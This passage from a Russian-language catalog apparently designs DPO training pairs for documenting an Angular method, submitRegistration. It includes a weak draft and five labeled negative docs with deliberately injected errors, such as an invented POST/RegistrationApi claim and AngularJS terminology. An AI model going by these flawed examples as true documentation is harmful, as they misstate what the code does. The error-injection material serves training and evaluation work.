    "section-completeness: все 8 обязательных секций живого шаблона DocumentationGeneratorUnit (Meaning/Location/Parameters/Return/Called By/Calls/Stack And Version/Evidence, :19–:29) — ось скорера documentation_required_field_missing",
    "WHY/HOW/WHAT-читаемость: Meaning объясняет роль метода в демо-потоке (локальный переход состояния + статусное сообщение) и ЯВНО фиксирует статическую природу (нет сети/сервера), а не пересказывает имя метода — ось скорера PromptError-11 Vague",
    "никаких environment-зависимых утверждений: dev-сервер/порт/машина/браузер как контракт запрещены — ось скорера PromptError-12 Context Dependency"
  ],
  "wrong_markers": [
    "doc_hallucinated_claim", "doc_omitted_behavior_false_absence", "doc_wrong_framework_terminology", "ORCH-02", "PromptError-11"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный wiki-док метода (markdown, 8 секций живого шаблона); один метод, не файл и не проект",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**`Y_best` (current_best_output, развёрнуто; правдоподобный слабый док в стиле провальной
base-модели — ложное серверное утверждение + выдуманный параметр + пустой Evidence; это НЕ инъекции
негативов, а слабый черновик с несколькими слабостями, как `Y_best` PE-4/PE-5/PE-6):**

```markdown
# submitRegistration

## Meaning
Отправляет данные регистрации на сервер и ставит письмо с подтверждением в очередь на доставку.

## Location
app.ts

## Parameters
- request

## Return
Возвращает результат отправки регистрации.

## Called By
- none recorded

## Calls
- none recorded

## Stack And Version
- unknown

## Evidence
- none recorded
```

Слабости `Y_best` (то, что учитель должен улучшить): Meaning несёт ЛОЖНОЕ серверное утверждение,
снятое ПРЯМО с UI-строки (:100), при нулевом транспорте в коде (профиль измеренного `0.68`);
Parameters несут выдуманный `request` (живая сигнатура — БЕЗ параметров); Return — ложь (живой метод
`void`); Location без пути/строки; Called By/Calls/Stack/Evidence пусты (5 из 8 живых флагов :19–:29
провалены); реальный side-effect `message`→`role=status` не покрыт. Это ровно профиль измеренного
провала: пересказ без grounding (`0.286`) + ложное утверждение (`0.68`).

Бюджет (plan-09 :499; plan-08 §3.5.2 :814, `num_ctx≈8192`): `max_input_tokens = num_ctx −
reserved_output_tokens`. Аппроксимация автора: task+criteria ≈ 850 ток.; input_context ≈ 950;
current_best_output ≈ 200; format ≈ 350; резерв ответа 1024 — итого ≈ 3400 ≪ 8192: unit-level (док
ОДНОГО метода, не «весь клиент»), влезает без порезки (`trimmed=false`; фактический токен-счёт меряет
токенайзер при build, каталог его НЕ заявляет).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = `Y_goal`; wiki-док в живом 8-секционном формате
:54–:82, каждое утверждение трассируемо, статическая природа задокументирована явно):**

```markdown
# App.submitRegistration

## Meaning
Локальный демо-переход анкеты регистрации из состояния 'registration' в 'pending': устанавливает
сигнал journeyState в 'pending' (:99) и статусное сообщение message (:100), которое шаблон показывает
в role="status"-блоке [ev-05], после чего pending-ветка рендерит экран «Check your email» [ev-06].
СТАТИЧЕСКОЕ демо: метод НЕ выполняет сетевых вызовов и НЕ создаёт серверной регистрации — в импортах
компонента нет HttpClient (:1–:3), транспортного слоя в src нет [ev-07]; текст сообщения про
«verification email … queued» — UI-строка, а не выполняемое поведение [ev-03]. Значения form-сигналов
email()/password() (:33–:34) этим методом НЕ читаются [ev-02].

## Location
flows/FLOW-01-user-registration/client/angular/src/app/app.ts:98

## Parameters
- none recorded (метод без параметров [ev-03]; входные данные живут в сигналах компонента и этим
  методом не читаются [ev-02])

## Return
void — эффект только через две мутации сигналов: journeyState.set('pending') и message.set(…)
(WritableSignal.set) [ev-03]; видимый результат — статус-нотис [ev-05] и pending-экран [ev-06].

## Called By
- кнопка шаблона: <button data-testid="submit-registration" (click)="submitRegistration()"> —
  app.html:57 [ev-04]

## Calls
- this.journeyState.set('pending') (:99); this.message.set('Registration is saved. …') (:100) [ev-03]
- сервисы/HTTP/подписки не вызываются [ev-07]

## Stack And Version
Target framework: Angular 21.2, standalone signal-компонент (package.json:18; декларация :21–:26).
Language version: TypeScript ~5.9.2 (package.json:32; carrier-нота: живое поле носителя названо
CSharpLanguageVersion :1570 — .NET-флейвор записи, см. PE-7.1).

## Evidence
- ev-01 (декларация :21–:26); ev-02 (сигналы :29–:36); ev-03 (тело :98–:101);
- ev-04 (кнопка app.html:57); ev-05 (role=status app.html:40); ev-06 (pending-ветка app.html:60–:61);
- ev-07 (absence: imports :1–:3 без HttpClient; survey 47 клиентов = 0 хитов)
```

```json
{
  "improvements": [
    "устранён false-presence: «отправляет на сервер / ставит письмо в очередь» снято — сетевых вызовов в трассе нет; статическая природа задокументирована ЯВНО с опорой на absence-evidence ev-07",
    "evidence-grounding: каждое claim-предложение получило file:line/ev-привязку (grounding rate 1.0; в черновике Evidence был пуст)",
    "contract-accuracy: убран выдуманный параметр request — живая сигнатура submitRegistration(): void без параметров; Return исправлен на void с перечислением реальных сигнальных эффектов",
    "покрыт реальный side-effect (анти-false-absence): message.set → role=\"status\"-блок + pending-экран шаблона; зафиксировано, что form-сигналы email/password методом НЕ читаются",
    "терминология Angular 21: standalone/signal/WritableSignal.set — без AngularJS-словаря",
    "заполнены все 8 обязательных секций живого шаблона (в черновике 5 из 8 флагов провалены)"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (doc-ось строки 6 карты §3 = оси строки 5
«grounding-проверка: каждое утверждение ссылается на реальный код-факт» + «терминология фреймворка»;
детерминированный eval-only судья; пороги/веса — per-WO деталь, WO может только УЖЕСТОЧИТЬ):**
1. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax);
2. **grounding-rate (ПЕРВИЧНАЯ ось, как PE-6):** детерминированный сплит `goal_text` на
   claim-предложения → каждое несёт распознаваемую привязку (`:NN`/`file:line`/`ev-NN`) к факту из
   `input_context`; rate < 1.0 — провал (живой числовой носитель — `exact_evidence_accuracy`
   оркестратора :129 + `ProjectWikiCoverageVerifier`);
3. **anti-hallucination / false-presence чек (`doc_hallucinated_claim`, клиентская острота):**
   словарный детектор транспортных утверждений (`HttpClient`/POST/`subscribe`/endpoint/queued/сервер)
   — транспортное утверждение в УТВЕРДИТЕЛЬНОЙ форме без поддерживающего факта = `doc_hallucinated_claim`;
   отрицательная форма легальна ТОЛЬКО с привязкой к absence-evidence ev-07 (детерминированный прокси —
   negation-scope проверка предложения); полный семантический чекер — **[условно от M1]**;
4. **coverage / false-absence чек (`doc_omitted_behavior_false_absence`, расширение этого прохода):**
   counted-список контракт-критичных фактов трассы (обе мутации сигналов [ev-03], Called By [ev-04],
   absence-факт [ev-07]) — каждый обязан быть покрыт ≥1 предложением дока; непокрытый факт =
   `doc_omitted_behavior_false_absence` (живой носитель оси — 8 обязательных флагов :19–:29 +
   `must_include_*` промпт генератора);
5. **contract-accuracy:** сигнатура / имена сигналов / значение `'pending'` / testids byte-exact к
   `input_context`; выдуманный параметр или ложный Return — провал (класс `PromptError-09`, если это
   рассинхрон с кодом);
6. **section-completeness:** живые 8 флагов `DocumentationGeneratorUnit` (:19–:29) — все true; провал
   любого = живой warning `documentation_required_field_missing` (:30);
7. **framework-terminology чек (`doc_wrong_framework_terminology`, ось строки 6):** словарь AngularJS
   (`$scope`/controller/digest/ng-controller) в Angular-доке = `doc_wrong_framework_terminology`
   (обоснование сплита — `RAG-02` :860);
8. **vague-чек (`PromptError-11`):** Meaning несёт ≥2 контрактных факта (переход состояния +
   статическая природа) — иначе класс `PromptError-11 Vague`;
9. **environment-чек (`PromptError-12`):** dev-порт/машина/браузер как контракт = `PromptError-12`
   (в негативах этого прохода класс НЕ инстанцирован — покрыт PE-6 N5, та же ось; честная нота).

Решение гейта (наш `ChosenSelectionRule`, plan-09 :497–:498): `Y_goal := argmax_k Score(g_k)`
(best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT); `chosen = Y_goal ⇔ Score(Y_goal) >
Score(Y_best)`, ничья/НЕТ → `chosen = Y_best` (лучший кандидат УЧЕНИКА). Судейские скоры
(grounding/coverage/contract/terminology) — `preference_score`/`Y_best`-аудит, они НЕ авторствуют
`chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Живое поле `Confidence` юнита
(:43) в приёмке НЕ участвует (PE-7.5 п.2). Непобедившие генерации учителя `g_k` (k≠argmax) — eval-only.

**(г) STUDENT-проекция (типизированный unit-I/O обучаемой стороны):** как PE-6: doc-юнит:
`InputContext{documentation_unit (15-полевая проекция `ProjectDocumentationUnit` с carrier-нотой),
y_best_doc}` → улучшенный wiki-док (текст). В паре: `InputContext` = типизированный юнит + черновик (БЕЗ
сырого промпта пользователя — анти-replay), `Chosen` = принятый док, `Rejected` = дефектный вариант.
Достижимость студентом (≤3–4B / узкая специализация): единица — ОДИН короткий док в ЖЁСТКОМ
8-секционном шаблоне с конечным словарём клиентских паттернов (signal/standalone/testid/role=status/
absence-формула) — структурный выход, не свободное эссе; до обучения студент честно отдаёт not_ready —
путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD` (runtime уже говорит `runner_missing` :68). Всё
**[условно от M1/M2]**.

#### PE-7.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошим доком (б): полный правдоподобный wiki-док (НЕ отказ, НЕ
мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды: **3 доменно-локальных** (право
§2.3: `doc_hallucinated_claim` — переиспользован из PE-6 без переименования; `doc_omitted_behavior_false_absence`
и `doc_wrong_framework_terminology` — два новых явных, объявлены в шапке прохода) **+ 2 канонических**
(строка 5/6 карты §3). **Пара форм N1↔N4 — намеренный КОНТРАСТ false-presence↔false-absence** (инсайт
PE-6 инстанцирован ОБЕИМИ формами). Живой доменный стиль подтверждён кодом: генератор уже кладёт
`[WRONG:]` в rejected-текст (:77–:96) и гейтит `wrong_annotation_rate` (:39). Аннотация строго
`[WRONG: код — описание — последствие]`, ровно одна главная ошибка.

**N1 — критический, FALSE-PRESENCE (THE-дефект домена: `doc_hallucinated_claim`, приглашённый самим
кодом; главная ось скорера).** В Meaning добавлено утверждение с фиктивной привязкой:
`«Метод отправляет POST на серверный endpoint регистрации через типизированный RegistrationApi и управляет подпиской через takeUntilDestroyed (:98) [ev-03].»` (всё остальное без изменений)
`[WRONG: doc_hallucinated_claim (доменно-локальный, переиспользован из PE-6 БЕЗ переименования, КРИТИЧЕСКИЙ; форма FALSE-PRESENCE — док утверждает существование поведения, которого НЕТ; родитель канонически ОТСУТСТВУЕТ — измеренный главный дефект RAG-02 hallucination_rate=0.68 при пороге 0.00; в живой таксономии генератора класса НЕТ — все 10 counted rejected-веток = omission/false-absence) — у статического демо нет ни HTTP, ни подписок (imports :1–:3 без HttpClient; survey 47 клиентов = 0 хитов), а привязка к ev-03 фиктивна: тело :98–:101 мутирует два сигнала и всё; ловушка усилена самим кодом — UI-строка :100 говорит про «queued email», и наивный документатор возводит строку в поведение; последствие: разработчик/QA планируют изменения и тесты против несуществующего транспорта, импакт-анализ строится на выдумке — ровно измеренный класс hallucination_rate=0.68, и которого нет ни в doc-генераторе, ни в PromptError/ORCH-каноне]`

**N2 — канонический (`ORCH-02 Missing Evidence`; grounding снят).** Все `file:line`/ev-привязки
удалены из всех секций, секция Evidence заменена на `- none recorded`; текст утверждений (включая
статическую природу) сохранён:
`[WRONG: ORCH-02 Missing Evidence (канонический; живой доменный сиблинг missing_evidence — DocumentationGeneratorDpoGenerator.cs:83–:84 «produces text that cannot be cited or verified by the project-local wiki») — утверждения дока верны (включая статическую природу), но непроверяемы: wiki не может ни процитировать, ни валидировать их против трассы; grounding rate падает с 1.0 до 0, продукт-инвариант project-local wiki (ответ с точными code-evidence) сломан]`

**N3 — канонический (`PromptError-11 Vague Deliverables`; расплывчатость).** Meaning и Return заменены
пересказом без контракта:
`«## Meaning\nМетод обрабатывает отправку формы регистрации.\n…\n## Return\nВозвращает результат обработки.»` (привязки и остальные секции без изменений)
`[WRONG: PromptError-11 Vague Deliverables (канонический) — контракт растворён: ни имён сигналов, ни значения 'pending', ни статической природы, ни того, что живой метод возвращает void (а не «результат»); по такому доку нельзя ни предсказать видимый эффект, ни сделать импакт-анализ — деливерабл документации не поставлен, хотя текст выглядит «нормальным»]`

**N4 — доменно-локальный, FALSE-ABSENCE (`doc_omitted_behavior_false_absence`, НОВЫЙ явный код;
КОНТРАСТ-форма к N1 — инсайт PE-6).** Из Meaning/Return/Calls удалено ВСЁ про `message`: пропала
мутация `message.set` (:100), связь со `role="status"`-блоком [ev-05] и строка Calls про `message`; док
честно описывает `journeyState`-переход и статическую природу (всё остальное без изменений):
`[WRONG: doc_omitted_behavior_false_absence (доменно-локальный, НОВЫЙ ЯВНЫЙ КОД; форма FALSE-ABSENCE — док замалчивает поведение, которое ЕСТЬ) — реальный side-effect метода (статусное сообщение → role="status"/data-testid="status-message" app.html:40) исчез из дока: разработчик, меняющий метод по доку, не знает, что на message() висят UX-нотис и Playwright-тест статусного блока — «безопасная» правка молча ломает видимый контракт; канонического кода класс не имеет (ORCH-02 — про снятые ЦИТАТЫ, PromptError-09 — про отставший от ИЗМЕНЕНИЯ кода док; здесь док свеж и цитирует, но НЕПОЛОН по ПОВЕДЕНИЮ); живая доменная семья missing_* (:77–:96) — вся этого класса, но на уровне СЕКЦИЙ; N4 инстанцирует false-absence на уровне ПОВЕДЕНИЯ внутри заполненных секций — недостающая грань живого seed; ЗЕРКАЛО к N1: N1 добавляет несуществующее, N4 убирает существующее — обе формы обязаны быть в батче]`

**N5 — доменно-локальный (`doc_wrong_framework_terminology`; терминология фреймворка — ось строки 6).**
Meaning/Calls переписаны в AngularJS-словаре при сохранении фактов и привязок:
`«Контроллер обновляет $scope.journeyState, и digest-цикл перерисовывает представление; двусторонний ng-model синхронизирует поля формы (:99–:100) [ev-03].»` (всё остальное без изменений)
`[WRONG: doc_wrong_framework_terminology (доменно-локальный, НОВЫЙ ЯВНЫЙ КОД; ось строки 6 карты «+ терминология фреймворка») — факты и привязки верны, но словарь ЧУЖОГО фреймворка: живой компонент — standalone signal-компонент Angular 21 без $scope/controller/digest (декларация :21–:26, мутации через WritableSignal.set :99–:100); последствие: разработчик пишет AngularJS-паттерны против Angular 21, а словарь платного Angular-домена загрязняется AngularJS-словарём — ровно то смешение, ради которого языковые планы обучения НАМЕРЕННО разделены (RAG-02 :860: «чтобы модель не отвечала на AngularJS языком Angular 2+»)]`

**Маппинг на канон (честная нота именования, single-owner FC-44):** N1/N4/N5 несут ЯВНЫЕ
доменно-локальные коды, потому что среди канонических `PromptError-01..12`/`ORCH-01..10` НЕТ кода для
false-presence/hallucination (N1), false-absence поведения внутри заполненных секций (N4) и
кросс-фреймворк-словарного дефекта (N5), И их нет в живой таксономии doc-генератора (counted: 10
rejected-веток, все omission/секционные). `doc_hallucinated_claim` — переиспользован из PE-6 БЕЗ
переименования (no dual-canon); `doc_omitted_behavior_false_absence` и `doc_wrong_framework_terminology`
— новые явные коды, объявлены в шапке прохода. N2/N3 несут КАНОНИЧЕСКИЕ имена (`ORCH-02`,
`PromptError-11`) — переименовывать канонические имена ЗАПРЕЩЕНО (no dual-canon). Гейты пары: G1 (каждый
N — полный правдоподобный док: строка-возведённая-в-поведение / без-цитат / вода / замолчанный
side-effect / чужой словарь — профиль реальной doc-генерации над клиентом, не отказ и не мусор); G2/G3
(код таксономии указан + `[WRONG:]` присутствует, живой доменный стиль :77–:96); G5 (не почти-копия по
дифф-региону — доковый гейт PE-7.4); G6 (классы типичны: false-presence/без-evidence — измеренные оси
held-out гейта, false-absence — класс всей живой rejected-таксономии, терминология — ось намеренного
языкового сплита). Каждый N — ровно одна главная ошибка; слабый негатив (например, отличие только в
имени переменной) → отбраковка предохранителем (`PromptError-08 Poor Negative Examples` / `ORCH-10 Low
Signal Negative`, §1.3 п.6), НЕ обучение. Живые omission-классы генератора отдельными N НЕ дублируются
(существующий seed; SQL-семья — зона PE-8); `PromptError-09`/`PromptError-12` в клиентском проходе НЕ
инстанцированы — покрыты PE-6 N4/N5 той же доменной осью (честная нота, НЕ пропуск класса).

#### PE-7.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "client-docs-pair-0001",
  "Level": "unit",
  "NodeOrEdgeId": "client-docs/xiigen-flows/flow01-app-submit-registration",
  "InputContext": { "documentation_unit": "15-полевая проекция ProjectDocumentationUnit (модели :1561–:1576; carrier-нота: TypeScript-версия в поле CSharpLanguageVersion :1570): symbol=App.submitRegistration; source/line; framework=Angular 21.2 standalone; meaning; parameters; return; callees; callers; evidence-ids ev-01..ev-07 (код-факты трассы, ВКЛЮЧАЯ absence-факты ev-07)",
                    "y_best_doc": "<слабый черновик Y_best из PE-7.2>" },
  "Chosen":   { "doc_text": "<док (б): 8 секций живого шаблона, каждое утверждение с file:line/ev-привязкой, статическая природа задокументирована явно, grounding rate 1.0; ноль uncovered-facts>" },
  "Rejected": { "doc_text": "<N1: false-presence — POST/RegistrationApi/takeUntilDestroyed с фиктивной привязкой к ev-03>" },
  "WrongMarkers": ["[WRONG: doc_hallucinated_claim — док заявляет HTTP/подписку, которых у статического демо нет — импакт-анализ и тесты строятся против несуществующего транспорта]"],
  "Reason": "Клиентская документация project-local wiki обязана быть evidence-grounded В ОБЕ СТОРОНЫ: не утверждать несуществующее (false-presence — главный измеренный дефект домена, 0.68) и не замалчивать существующее (false-absence — класс всей живой rejected-таксономии); статическая природа демо-корпуса (47 клиентов, 0 транспорт-хитов) делает false-presence про HTTP самым типичным клиентским отказом",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["xiigen-flows-flow01-angular-client-spotread", "llm-mvp-core-42-docpipeline-spotread", "catalog-pe7-client-docs-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

*(Проекция противоположной стороны той же пары — для «обе проекции chosen/rejected»: `Rejected.doc_text`
поочерёдно = каждый из `N1`..`N5`; поле `Chosen` НЕ меняется. Пример второй пары для контраст-формы:
`{ "PairId":"client-docs-pair-0004", "Rejected":{ "doc_text":"<N4: false-absence — удалён side-effect
message.set→role=status>" }, "WrongMarkers":["[WRONG: doc_omitted_behavior_false_absence — док замалчивает
реальный side-effect статусного сообщения — «безопасная» правка молча ломает видимый контракт]"], …
остальные 12 полей идентичны паре 0001, DpoTrainReady=false }`. Обе проекции — РАЗНЫЕ негативные шейпы
одной grounding-оси, обе обязаны присутствовать в доменной семье батча.)*

- **Поле 14 `DpoTrainReady` = `false` [условно от M1 + G-DPO-FINAL] (согласовано с PE-2..PE-6, §1.1,
  §4 п.4/п.6) — ФЛИП против образца-Fable (тот ставил `true`), с ДВУМЯ клиентскими каветами.**
  Доменного Phase-0-блока (как `TOKENIZER_BLOCKED` у HE_EN) НЕТ: TS/латиница токенайзер не блокируют
  (ивритские template-строки — та же BPE-кавета, что PE-3/PE-5, но не несущая часть doc-пары);
  первопартийный корпус — 47 живых клиентов. НО `false` держат ГЛОБАЛЬНЫЕ предусловия + ДВЕ клиентские
  каветы: **(кавета-1, grounding-легальность семей)** семья «доки статической формы» (signals/standalone/
  шаблон/RTL/testids) — живая и легко-grounded, лучший стартовый грануляр; семья «доки API-wiring» —
  **ПУСТАЯ by construction**: PE-5 (код) легально строил wiring как `SYNTHETIC_SEED` (форвард-контракт
  лежал в input_context КАК ЗАДАНИЕ), но док-домен так НЕ может — док ОПИСЫВАЕТ существующий код, и док
  про `RegistrationApi`/HTTP при 0 HttpClient-хитов = `doc_hallucinated_claim` by construction;
  wiring-doc строки разблокируются ТОЛЬКО после реального подключения клиентов к API (тогда снимется и
  контраст со строкой `RAG-02` :468 «Angular app should call backend job endpoints» — сегодня это
  wiki-evidence о ДОЛЖНОМ, не о СУЩЕМ); **(кавета-2, baseline-перенос)** измеренный провал `0.286`/`0.68`
  — на .NET wiki-корпусе; Angular-doc held-out НЕ мерился (Multi-Language: English promoted, TS PENDING,
  `RAG-02` :932/:954; приоритет расширения: SQL первым, Angular вторым) — клиентский training target
  наследует КЛАСС дефекта, но не числа. Плюс общие предусловия (как у PE-4/PE-5/PE-6): (а) до
  `G-DPO-FINAL` (overlay :48–:53) любой teacher-выход этапа `TP1_LOCAL` — eval/quarantine, никакого
  `TrainBatchAsync`; (б) builder/скорер/grounding-клаузный чекер канона в коде НЕ существуют —
  **[условно от M1]**; (в) training-vs-runtime wiring gap: чекпойнты не грузятся, диагноз провала =
  hash-token DPO-раннер + отсутствует обученный `ProjectWikiQueryPlanningFlow` (`RAG-02` :22);
  (г) carrier-mismatch полей (`CSharpLanguageVersion` :1570) — schema-generalization, кандидат PE-10.
  Отличие от образца-Fable (`true`): наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ задач —
  иначе `dual-live-canon` статуса готовности (FC-44). `false` = «маршрут не заблокирован ДОМЕННЫМ
  Phase-0 плюс держат глобальные execution-гейты», не «домен не готов навсегда». Всё **[условно от M1 +
  G-DPO-FINAL]**.
- **Reward-scalarization (ОБЯЗАТЕЛЬНА по trainable-architecture-decision SI_GATE_3 — сторона дока НЕ
  атомарный ответ, а строка-СТРУКТУРА → нужен именованный `reward(side)`-экстрактор; наш plan-07
  :341–:360, VERIFIED живым чтением в PE-6):** `SerializeCandidate(side)=doc_text`; далее каноном блока
  07: `reward(side)=Beta·(policyLogP(doc_text | input_context) − referenceLogP(doc_text | input_context))`;
  `margin = chosenReward − rejectedReward`. Судейские скоры (grounding/coverage/contract/terminology) →
  `preference_score`/`Y_best`-аудит, они НЕ авторствуют `chosen`/`rejected` и НЕ заменяют `reward(side)`
  (plan-07 :355–:357). Сторону без сериализации/скаляризации → `REWARD_EXTRACTOR_MISSING` (plan-07
  :359–:360). `margin ≤ 0.05` или `overlap ≥` доменный порог → `LOW_CONTRAST`, не учим (plan-07 :520).
- **EVIDENCE-GROUNDING гейт — переиспользован из PE-6.4 и РАСШИРЕН до БИНАПРАВЛЕННОГО (ключевой вклад
  этого прохода):** пара валидна ТОЛЬКО при grounding-дифференциале сторон, где дифференциал имеет ДВА
  направления по двум негативным формам: **(направление false-presence, как в PE-6):** `chosen` —
  каждое claim-предложение привязано И поддержано текстом факта (grounding rate = 1.0, unsupported-claims
  = 0); `rejected` — ≥1 unsupported/фиктивно-привязанное утверждение (N1) ЛИБО привязки сняты (N2);
  **(направление false-absence, добавлено PE-7):** `chosen` — каждый контракт-критичный факт трассы
  покрыт (uncovered-facts = 0; живой носитель оси — 8 обязательных флагов :19–:29 + `must_include_*`);
  `rejected` — ≥1 непокрытый контракт-критичный факт (N4). Обе формы — РАЗНЫЕ негативные шейпы одной
  grounding-оси, и обе обязаны присутствовать в доменной семье батча; доковая пара с идеальным overlap,
  но без дифференциала хотя бы в одном направлении = не doc-пара, а стилистическая. Живой числовой
  носитель оси — `exact_evidence_accuracy` (оркестратор :129) + `ProjectWikiCoverageVerifier`; клаузный
  чекер обоих направлений — **[условно от M1]**.
- **DOC-OVERLAP гейт (ВТОРИЧНЫЙ; доменное окно — рестейт PE-4.4/PE-5.4/PE-6.4 для доков):** одно-дефектная
  инъекция в ~30-строчный док даёт raw overlap ≫ 0.75 by construction — правило вычитания рамки: `frame`
  = section-headers шаблона (8 counted заголовков :54–:82) + verbatim контрактные строки из
  `input_context` (сигнатура/имена сигналов/testids — легальная общая основа обеих сторон);
  `shared=(chosen∩rejected)−frame; total=(chosen∪rejected)−frame; overlap_ratio=shared/total`. Гейт
  ОДНОСТОРОННИЙ: `overlap_ratio > 0.75 → discard`; нижней границы НЕТ; порог материальности: дифф-регион
  ≥ 1 claim-предложение ЛИБО ≥ 1 замолчанный контракт-факт (false-absence-класс); rename/whitespace-only
  дифф → discard (класс G5). **Обязательная кавета (concept vs runtime):** `0.75` — КОНЦЕПТУАЛЬНЫЙ порог
  (перенос PE-4.4); runtime-мерителя НЕ существует **[условно от M1]**; калибровка = обязанность
  DPO-build. `N1`–`N5` сконструированы с непересекающимися дифф-регионами (добавленное транспорт-предложение
  / снятые привязки / замена Meaning+Return / удалённое message-поведение / AngularJS-словарь) — попарный
  overlap дифф-регионов ≈ 0 by construction; фактический `overlap_ratio` меряет builder, НЕ каталог.
- **Fan-out (winner-vs-each-loser, SI_GATE_4):** 5 негативов на один `chosen` → 5 ОТДЕЛЬНЫХ пар
  `client-docs-pair-0001..0005` (по одной на `N1`..`N5`); поле `Rejected` НИКОГДА не несёт список (§1.3
  п.10; владелец проекции `producer-output → SourceRow[]` — builder WO-M1.1). Живая проекция: доменный
  record `DocumentationGeneratorDpoPair` (:1140) уже 1-к-1 (одна `Rejected`-строка на пару) — live→канон
  маппинг прямой, как в PE-6.
- **LegScope: `PersonalAdaptive` (Paid=Angular) — переобоснование против common-кандидата PE-6:** у PE-6
  `common` держался на ДВУХ основаниях (Free=.NET имя 42-домена `RAG-02` :18 + первопартийный источник).
  Для клиента первое НЕ переносится: Free-tier имя покрывает МЕХАНИКУ конвейера (шаблоны/флаги/гейты), а
  монетизационный сплит лицензирует ДОКУМЕНТИРУЕМЫЙ СТЕК — Paid=Angular/AngularJS/Java/SQL (`RAG-02`
  :18/:933, `LicenseManager.CheckDomain`+`DomainLoader`+CDN, приватный репо `xiigen_smart_domains`), и
  per-stack план `PLAN-WIKI-TRAINING-ANGULAR-v1` живёт в платной языковой семье (:855/:860). Сплит
  «механика-vs-строки»: сам конвейер = free/common, но DPO-СТРОКИ, обучающие «документировать Angular»,
  кормить free-common ногу НЕ смеют — иначе платная Angular-способность раздаётся бесплатно. Ближайшая
  честная проекция бинарной схемы = `PersonalAdaptive` (paid-domain, license-gated, NOT-for-free-common)
  — ПРОДУКТОВАЯ граница, не privacy-карантин; schema-extension «paid-domain leg» = кандидат PE-10;
  финальный сплит = `LUBA_PRODUCT_DECISION_RESIDUAL`. **[pass-time PE-7; SUPERSEDED FIX-RES-1 2026-07-14: задача 6
  (Angular-документация) → `RESOLVED_FROM_DOCUMENTED_AUTHORITY` (G4), остаётся non-blocking opt-in
  `paid-domain common leg`.]** Чужой пользовательский клиент-код — дополнительно
  `.xiigen` до redaction+approval (R-07/R-13).
- **Source-disjoint нота (HeldOut) — клиентская ОСТРОТА:** train = первопартийные Angular-доки-якоря
  РАЗНЫХ флоу (FLOW-01 + FLOW-08). Held-out дизайн ЖЁСТЧЕ серверного PE-6: 47 клиентов — однотипные
  клоны одного шаблона (survey подтверждён этим пассом), «другой FLOW-клиент» слабо-disjoint (та же
  шаблонная семья) — лексический Jaccard-guard train↔eval (§1.3 п.9) здесь КРИТИЧЕН, не формален; живого
  Angular вне flows-репо нет (mvp = React 18, platform = чистый .NET — PE-5.1). Честные held-out
  кандидаты: (i) методы РАЗНЫХ поведенческих семей внутри клиентов (constructor URL-парсинг :57–:74,
  `applyLanguage` RTL :121–:125 — не submit); (ii) будущий wired-клиент код после подключения к API;
  (iii) внешние открытые Angular-doc корпуса через лицензионный гейт two-layer language-плана
  (`ANGULAR-DOCS` из PE-5 — `VERIFY_BEFORE_USE` до реестрового вердикта). `HeldOut` — поле пары.
- **Leakage-нота (доковая специфика — ВСЕ 6 сигналов канона §1.4; образец-Fable нёс 5, терял
  `source_id`):** `ExcludedLeakageSignals` = полный канон `candidate_index`/`source_path`/`source_id`/
  `file_order`/`correlation_id`/`exact_prompt`. Доковое противоречие `source_path`: канон запрещает его
  как input-фичу СЕЛЕКЦИИ кандидата, но в доковом домене путь+строка — ЛЕГАЛЬНОЕ СОДЕРЖИМОЕ выхода
  (секция Location — обязательный флаг живого юнита). Разрешение: запрет действует на builder-селекцию
  (путь не смеет быть признаком выбора chosen/rejected), содержимое секций дока под запрет НЕ подпадает —
  иначе доменная задача неисполнима by construction.
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** канонического распределения
  клиентских doc-классов нет ни в `RAG-02`, ни в `RAG-10` — честная нота; ориентир-аналогия `RAG-10`
  §6.7: критический класс (`doc_hallucinated_claim`) ≈ 25% батча, негативов 60–70% от positive;
  ОБЯЗАТЕЛЬНОЕ доменное правило баланса форм (PE-7.5 п.3(б)): false-absence-негативы (короче chosen) и
  false-presence-негативы (длиннее chosen) смешиваются так, чтобы длина не коррелировала с меткой; живой
  генератор даёт готовый omission/false-absence-seed (9 именованных классов + default), false-presence-семья
  строится от `N1`; точный баланс = обязанность DPO-build, НЕ каталога.

#### PE-7.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и в
   `rejected`-ИСТОЧНИКЕ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации. Доменная
   ОСТРОТА гейта: живой генератор кладёт `[WRONG:]` ПРЯМО В ТЕКСТ rejected (:77–:96) и гейтит их наличие
   (`wrong_annotation_rate` :39) — при переиспользовании живых доменных пар builder ОБЯЗАН выполнить
   strip, иначе тренер выучит детекцию тега на первом же батче; это не гипотеза, а свойство существующего
   кода.
2. **Acceptance-signal independence (plan-09 :504–:544; SI_GATE_6/SI_GATE_7):** `chosen` решает ТОЛЬКО
   детерминированный doc-`IndependentDomainScorer` (grounding/coverage/contract/terminology — PE-7.2(в));
   `current_output_is_already_optimal` учителя — диагностика, скоринг исполняется ВСЕГДА;
